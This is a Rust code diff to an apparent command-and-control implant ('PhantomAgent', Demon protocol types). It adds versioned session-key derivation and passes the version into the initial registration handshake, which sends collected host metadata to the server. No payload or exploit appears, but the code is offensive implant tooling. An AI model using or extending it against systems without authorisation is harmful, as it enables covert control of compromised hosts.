@@ -5,7 +5,8 @@ use std::path::PathBuf;
 use std::time::Duration;
 
 use red_cell_common::crypto::{
-    AgentCryptoMaterial, derive_session_keys, generate_agent_crypto_material,
+    AgentCryptoMaterial, derive_session_keys, derive_session_keys_for_version,
+    generate_agent_crypto_material,
 };
 use red_cell_common::demon::{DemonCommand, DemonPackage};
 use time::{OffsetDateTime, Time};
@@ -50,10 +51,19 @@ impl PhantomAgent {
         let agent_id = rand::random::<u32>() | 1;
         let raw_crypto = generate_agent_crypto_material()?;
         let session_crypto = match config.init_secret.as_deref() {
-            Some(secret) => {
-                derive_session_keys(&raw_crypto.key, &raw_crypto.iv, secret.as_bytes())?
-            }
             None => raw_crypto.clone(),
+            Some(secret) => {
+                if let Some(version) = config.init_secret_version {
+                    derive_session_keys_for_version(
+                        &raw_crypto.key,
+                        &raw_crypto.iv,
+                        version,
+                        &[(version, secret.as_bytes())],
+                    )?
+                } else {
+                    derive_session_keys(&raw_crypto.key, &raw_crypto.iv, secret.as_bytes())?
+                }
+            }
         };
         let transport = HttpTransport::new(&config)?;
 
@@ -130,7 +140,12 @@ impl PhantomAgent {
     /// Perform the initial registration handshake.
     pub async fn init_handshake(&mut self) -> Result<(), PhantomError> {
         let metadata = self.collect_metadata();
-        let packet = build_init_packet(self.agent_id, &self.raw_crypto, &metadata)?;
+        let packet = build_init_packet(
+            self.agent_id,
+            &self.raw_crypto,
+            &metadata,
+            self.config.init_secret_version,
+        )?;
         let response = self.transport.send(&packet).await?;
         self.ctr_offset = parse_init_ack(&response, self.agent_id, &self.session_crypto)?;
         Ok(())
